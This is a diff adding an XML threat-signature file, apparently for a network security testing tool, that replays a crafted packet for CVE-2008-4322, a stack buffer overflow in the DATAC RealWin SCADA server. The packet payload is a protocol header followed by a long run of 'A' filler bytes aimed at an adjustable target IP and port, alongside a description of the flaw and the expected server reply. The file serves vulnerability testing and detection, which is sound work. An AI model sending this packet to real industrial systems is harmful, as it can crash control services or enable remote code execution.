@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="DATAC Control RealWin SCADA System Crafted Packet Handling Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a stack buffer overflow vulnerability in DATAC Control RealWin SCADA System server product. The vulnerability is due to a boundary error while parsing a crafted value in a FC_INFOTAG/SET_CONTROL packet. Remote unauthenticated attackers could exploit this vulnerability by sending a malicious packet to the target server and can execute arbitrary code with the privileges of the affected service, normally Administrator privileges on Windows systems, or cause Denial of Service condition due to abnormal termination of the service. An attack targeting this vulnerability can result in the injection and execution of arbitrary code. If code execution is successful, the behaviour of the target will depend on the injected code. Any injected code will be executed with the privileges of the affected service, normally Administrator privileges on Windows systems. In the case of an unsuccessful code execution attack, the service will terminate abnormally due to memory corruption causing the Denial of Service condition."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary Protocol(over port 910/TCP)"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="DATAC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="DATAC_Control_RealWin_SCADA_System"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="DATAC_Control_RealWin_SCADA_System_2.0_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-4322"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="57f15e01f42e6227082cb9daf88f2a11"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634000252978890491"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264415405" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="E">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:B6:D7:85" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0330" Identification="4BAD" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8AC6" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="36603" destPort="$destPort" SeqNumber="4ADEF664" AckNumber="669A10C4" HeaderLength="08" WindowSize="002E" Checksum="C089" UrgentPointer="0000" Options="0101080A5091BDCC00000000" Payload="10235467EE02000000000A000500414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:B6:D7:85" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0042" Identification="6AD9" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="2E88" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="36603" SeqNumber="669A10C4" AckNumber="4ADEF960" HeaderLength="08" WindowSize="F7F4" Checksum="8F4B" UrgentPointer="0000" Options="0101080A0000CC025091BDCC" Payload="1023546700000000000001000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
